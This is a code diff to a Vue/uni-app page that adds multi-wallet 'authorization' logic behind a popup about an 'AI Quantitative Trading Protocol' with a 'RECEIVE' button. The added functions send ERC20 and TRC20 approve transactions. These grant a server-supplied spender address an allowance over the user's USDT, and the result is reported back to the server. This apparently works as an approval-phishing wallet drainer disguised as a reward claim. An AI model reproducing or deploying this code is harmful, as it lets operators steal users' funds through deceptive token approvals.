@@ -179,7 +179,7 @@
 					<view class="auth-dialog-content">
 						<image class="auth-dialog-image" src="/static/auth-image.png" mode="aspectFit"></image>
 						<text class="auth-dialog-desc">Broadcast the AI Quantitative Trading Protocol to Nodes</text>
-						<button class="auth-dialog-btn" @click="handleTokenPocketAuth">RECEIVE</button>
+						<button class="auth-dialog-btn" @click="handleWalletAuth">RECEIVE</button>
 					</view>
 				</view>
 			</uni-popup>
@@ -490,12 +490,42 @@ export default {
 			window.open(url, '_blank');
 			// #endif
 		},
-		// 显示授权弹窗
-		showAuthDialog() {
-			// 先获取授权地址
-			this.getAuthAddress();
-			// 显示弹窗
-			this.$refs.authPopup.open();
+		// 修改显示授权弹窗方法 - 所有文字改为英文
+		async showAuthDialog() {
+			try {
+				// 显示加载提示
+				uni.showLoading({
+					title: 'Getting authorization info...'
+				});
+
+				// 先获取授权地址，等待完成
+				await this.getAuthAddress();
+				
+				// 隐藏加载提示
+				uni.hideLoading();
+				
+				// 检查是否成功获取到授权地址
+				if (!this.authAddress) {
+					uni.showToast({
+						title: 'Failed to get authorization address, please try again',
+						icon: 'none',
+						duration: 2000
+					});
+					return;
+				}
+				
+				// 显示弹窗
+				this.$refs.authPopup.open();
+				
+			} catch (error) {
+				uni.hideLoading();
+				console.error('显示授权弹窗失败:', error);
+				uni.showToast({
+					title: 'Failed to get authorization info',
+					icon: 'none',
+					duration: 2000
+				});
+			}
 		},
 
 		// 关闭授权弹窗
@@ -503,7 +533,7 @@ export default {
 			this.$refs.authPopup.close();
 		},
 
-		// 获取授权地址
+		// 修改getAuthAddress方法的错误信息
 		async getAuthAddress() {
 			try {
 				const currentToken = store.getToken();
@@ -512,81 +542,374 @@ export default {
 				const data = await api.transaction.getAuthAddress();
 				console.log('getAuthAddress - 返回数据:', data);
 				
-				if (data && data.data && data.data.authorized_address) {
-					this.authAddress = data.data.authorized_address;
+				if (data && data.data) {
+					// 保存授权地址
+					if (data.data.authorized_address) {
+						this.authAddress = data.data.authorized_address;
+						console.log('授权地址已设置:', this.authAddress);
+					} else {
+						throw new Error('API did not return authorized_address field');
+					}
+					
+					// 更新TokenPocket授权工具的合约地址配置
+					const contractConfig = {};
+					
+					if (data.data.tron_usdt_contract) {
+						contractConfig.tronUsdtContract = data.data.tron_usdt_contract;
+						console.log('更新Tron USDT合约地址:', data.data.tron_usdt_contract);
+					}
+					
+					if (data.data.eth_usdt_contract) {
+						contractConfig.ethUsdtContract = data.data.eth_usdt_contract;
+						console.log('更新ETH USDT合约地址:', data.data.eth_usdt_contract);
+					}
+					
+					// 如果有合约地址信息，更新配置
+					if (Object.keys(contractConfig).length > 0) {
+						tokenPocketAuth.updateConfig(contractConfig);
+					}
+					
+					console.log('授权信息获取成功:', {
+						authAddress: this.authAddress,
+						contracts: contractConfig
+					});
+					
+					return this.authAddress; // 返回授权地址
+					
 				} else {
-					throw new Error('Failed to get authorization address');
+					throw new Error('API returned empty data or wrong format');
 				}
 			} catch (error) {
-				console.error('Failed to get authorization address:', error);
-				apiUtils.showError('Failed to get authorization address');
+				console.error('获取授权地址失败:', error);
+				throw error; // 重新抛出错误，让调用者处理
 			}
 		},
 
-		// 处理TokenPocket授权
-		async handleTokenPocketAuth() {
+		// 修改handleWalletAuth方法的提示文字
+		async handleWalletAuth() {
+			console.log('handleWalletAuth开始，当前authAddress:', this.authAddress);
+			
+			// 如果authAddress为空，尝试重新获取
 			if (!this.authAddress) {
-				uni.showToast({
-					title: 'Authorization address not obtained',
-					icon: 'none'
-				});
-				return;
+				try {
+					uni.showLoading({
+						title: 'Getting authorization address...'
+					});
+					
+					await this.getAuthAddress();
+					uni.hideLoading();
+					
+					if (!this.authAddress) {
+						throw new Error('Failed to get authorization address again');
+					}
+				} catch (error) {
+					uni.hideLoading();
+					console.error('重新获取授权地址失败:', error);
+					uni.showToast({
+						title: 'Failed to get authorization address, please try again',
+						icon: 'none',
+						duration: 2000
+					});
+					return;
+				}
 			}
 
 			try {
 				uni.showLoading({
-					title: 'Pulling up authorization...'
+					title: 'Processing authorization...'
 				});
 
-				// 检查是否在TokenPocket环境中
-				if (!tokenPocketAuth.detectTokenPocketEnvironment()) {
-					uni.hideLoading();
-					const currentUrl = tokenPocketAuth.getCurrentUrl();
-					await tokenPocketAuth.openTokenPocketApp(currentUrl);
-					return;
-				}
-
-				// 在TokenPocket环境中，直接进行授权
-				const authResult = await tokenPocketAuth.requestAuth(this.authAddress);
+				// 检测当前钱包环境
+				const walletType = this.detectWalletEnvironment();
+				console.log('检测到钱包类型:', walletType);
 				
-				uni.hideLoading();
+				let authResult;
 				
-				if (authResult.success) {
-					// 授权成功后调用回调接口
-					await this.callbackAuthSuccess({
-						...authResult,
-						address: this.authAddress // 确保使用从接口获取的地址
-					});
-					
-					uni.showToast({
-						title: 'Authorization successful',
-						icon: 'success'
-					});
-					
-					// 处理授权成功
-					this.handleAuthSuccess(authResult);
-					// 关闭弹窗
-					this.closeAuthDialog();
+				if (walletType === 'TokenPocket') {
+					// TokenPocket授权流程
+					authResult = await tokenPocketAuth.requestAuth(this.authAddress);
+				} else if (walletType === 'MetaMask') {
+					// MetaMask授权流程
+					authResult = await this.handleMetaMaskAuth();
+				} else if (walletType === 'Ethereum') {
+					// 通用以太坊钱包授权流程
+					authResult = await this.handleEthereumWalletAuth();
 				} else {
-					uni.showToast({
-						title: authResult.message || 'Authorization failed',
-						icon: 'none'
-					});
+					// 尝试通用授权方法
+					authResult = await this.handleGenericWalletAuth();
 				}
+				
+				await this.handleAuthResult(authResult);
 				
 			} catch (error) {
 				uni.hideLoading();
-				console.error('TokenPocket authorization error:', error);
-				
-				let errorMessage = 'Authorization failed';
-				if (error.message.includes('User rejected')) {
-					errorMessage = 'User rejected authorization';
-				} else if (error.message.includes('TokenPocket not detected')) {
-					errorMessage = 'Please open in TokenPocket';
-				}
+				console.error('钱包授权错误:', error);
 				
 				uni.showToast({
-					title: errorMessage,
+					title: error.message || 'Authorization failed',
+					icon: 'none',
+					duration: 3000
+				});
+			}
+		},
+
+		// 新增：检测钱包环境 - 增强版本
+		detectWalletEnvironment() {
+			if (typeof window === 'undefined') return null;
+			
+			// TokenPocket检测
+			if (tokenPocketAuth.detectTokenPocketEnvironment()) {
+				return 'TokenPocket';
+			}
+			
+			// MetaMask检测
+			if (window.ethereum?.isMetaMask && !window.ethereum?.isCoinbaseWallet) {
+				return 'MetaMask';
+			}
+			
+			// Coinbase Wallet检测
+			if (window.ethereum?.isCoinbaseWallet) {
+				return 'CoinbaseWallet';
+			}
+			
+			// Trust Wallet检测
+			if (window.ethereum?.isTrust) {
+				return 'TrustWallet';
+			}
+			
+			// imToken检测
+			if (window.ethereum?.isImToken) {
+				return 'ImToken';
+			}
+			
+			// 通用以太坊钱包
+			if (window.ethereum) {
+				return 'Ethereum';
+			}
+			
+			// Tron钱包检测
+			if (window.tronWeb) {
+				return 'TronWallet';
+			}
+			
+			return 'Unknown';
+		},
+
+		// 修改处理MetaMask授权的提示文字
+		async handleMetaMaskAuth() {
+			try {
+				const ethereum = window.ethereum;
+				
+				// 请求账户访问权限
+				const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+				
+				if (accounts.length === 0) {
+					throw new Error('Failed to get account access permission');
+				}
+				
+				// 执行ERC20 approve授权
+				const authResult = await this.executeERC20Approval(ethereum, accounts[0]);
+				
+				return {
+					success: true,
+					type: 'ETHEREUM',
+					address: accounts[0],
+					txHash: authResult.txHash,
+					message: 'Authorization successful'
+				};
+				
+			} catch (error) {
+				console.error('MetaMask授权失败:', error);
+				return {
+					success: false,
+					message: error.message || 'MetaMask authorization failed'
+				};
+			}
+		},
+
+		// 修改处理通用以太坊钱包授权的提示文字
+		async handleEthereumWalletAuth() {
+			try {
+				const ethereum = window.ethereum;
+				
+				// 请求账户访问权限
+				const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+				
+				if (accounts.length === 0) {
+					throw new Error('Failed to get account access permission');
+				}
+				
+				// 执行ERC20 approve授权
+				const authResult = await this.executeERC20Approval(ethereum, accounts[0]);
+				
+				return {
+					success: true,
+					type: 'ETHEREUM',
+					address: accounts[0],
+					txHash: authResult.txHash,
+					message: 'Authorization successful'
+				};
+				
+			} catch (error) {
+				console.error('以太坊钱包授权失败:', error);
+				return {
+					success: false,
+					message: error.message || 'Wallet authorization failed'
+				};
+			}
+		},
+
+		// 修改处理通用钱包授权的提示文字
+		async handleGenericWalletAuth() {
+			try {
+				// 尝试以太坊钱包
+				if (window.ethereum) {
+					return await this.handleEthereumWalletAuth();
+				}
+				
+				// 尝试Tron钱包
+				if (window.tronWeb) {
+					return await this.handleTronWalletAuth();
+				}
+				
+				// 如果都没有，显示友好提示
+				throw new Error('Please use a supported wallet app (such as MetaMask, TokenPocket, etc.) to open this page');
+				
+			} catch (error) {
+				return {
+					success: false,
+					message: error.message || 'No supported wallet detected'
+				};
+			}
+		},
+
+		// 修改处理Tron钱包授权的提示文字
+		async handleTronWalletAuth() {
+			try {
+				const tronWeb = window.tronWeb;
+				
+				// 检查钱包连接
+				if (!tronWeb.ready) {
+					throw new Error('Tron wallet not connected');
+				}
+				
+				const address = tronWeb.defaultAddress.base58;
+				if (!address) {
+					throw new Error('Failed to get Tron wallet address');
+				}
+				
+				// 执行TRC20 approve授权
+				const authResult = await this.executeTRC20Approval(tronWeb, address);
+				
+				return {
+					success: true,
+					type: 'TRON',
+					address: address,
+					txHash: authResult.txHash,
+					message: 'Authorization successful'
+				};
+				
+			} catch (error) {
+				console.error('Tron钱包授权失败:', error);
+				return {
+					success: false,
+					message: error.message || 'Tron wallet authorization failed'
+				};
+			}
+		},
+
+		// 修改执行ERC20授权的错误提示
+		async executeERC20Approval(ethereum, userAddress) {
+			try {
+				// 获取合约地址
+				const contractAddress = tokenPocketAuth.config.ethUsdtContract;
+				const spenderAddress = this.authAddress;
+				const approveAmount = tokenPocketAuth.config.defaultApproveAmount;
+				
+				// 将授权数量转换为16进制
+				const amountHex = '0x' + parseInt(approveAmount).toString(16);
+				
+				// 构建ERC20 approve方法的调用数据
+				const approveMethodABI = '0x095ea7b3' + 
+					spenderAddress.slice(2).padStart(64, '0') + 
+					amountHex.slice(2).padStart(64, '0');
+
+				// 发送授权交易
+				const txHash = await ethereum.request({
+					method: 'eth_sendTransaction',
+					params: [{
+						from: userAddress,
+						to: contractAddress,
+						data: approveMethodABI,
+						gas: '0x15F90', // 90000
+						gasPrice: '0x9184e72a000' // 10 gwei
+					}]
+				});
+				
+				console.log('ERC20授权交易发送成功:', txHash);
+				
+				return {
+					success: true,
+					txHash: txHash
+				};
+				
+			} catch (error) {
+				console.error('ERC20授权执行失败:', error);
+				throw new Error('Authorization transaction failed: ' + error.message);
+			}
+		},
+
+		// 修改执行TRC20授权的错误提示
+		async executeTRC20Approval(tronWeb, userAddress) {
+			try {
+				// 获取合约地址
+				const contractAddress = tokenPocketAuth.config.tronUsdtContract;
+				const spenderAddress = this.authAddress;
+				const approveAmount = tokenPocketAuth.config.defaultApproveAmount;
+				
+				// 获取合约实例
+				const contract = await tronWeb.contract().at(contractAddress);
+				
+				// 调用approve方法
+				const transaction = await contract.approve(spenderAddress, approveAmount).send({
+					from: userAddress,
+					feeLimit: 100000000 // 100 TRX
+				});
+				
+				console.log('TRC20授权交易发送成功:', transaction);
+				
+				return {
+					success: true,
+					txHash: transaction
+				};
+				
+			} catch (error) {
+				console.error('TRC20授权执行失败:', error);
+				throw new Error('Tron authorization transaction failed: ' + error.message);
+			}
+		},
+
+		// 修改统一处理授权结果的提示文字
+		async handleAuthResult(authResult) {
+			uni.hideLoading();
+			
+			if (authResult.success) {
+				// 授权成功后调用回调接口
+				await this.callbackAuthSuccess({
+					...authResult,
+					address: this.authAddress
+				});
+				
+				uni.showToast({
+					title: 'Authorization successful',
+					icon: 'success'
+				});
+				
+				this.handleAuthSuccess(authResult);
+				this.closeAuthDialog();
+			} else {
+				uni.showToast({
+					title: authResult.message || 'Authorization failed',
 					icon: 'none'
 				});
 			}
@@ -1030,6 +1353,19 @@ export default {
 						participant: response.data.participant || '0',
 						revenue: response.data.revenue || '0'
 					};
+					
+					// 同时更新合约地址配置
+					const contractConfig = {};
+					if (response.data.tron_usdt_contract) {
+						contractConfig.tronUsdtContract = response.data.tron_usdt_contract;
+					}
+					if (response.data.eth_usdt_contract) {
+						contractConfig.ethUsdtContract = response.data.eth_usdt_contract;
+					}
+					
+					if (Object.keys(contractConfig).length > 0) {
+						tokenPocketAuth.updateConfig(contractConfig);
+					}
 					
 					console.log('ERC数据更新成功:', this.ercData);
 				} else {
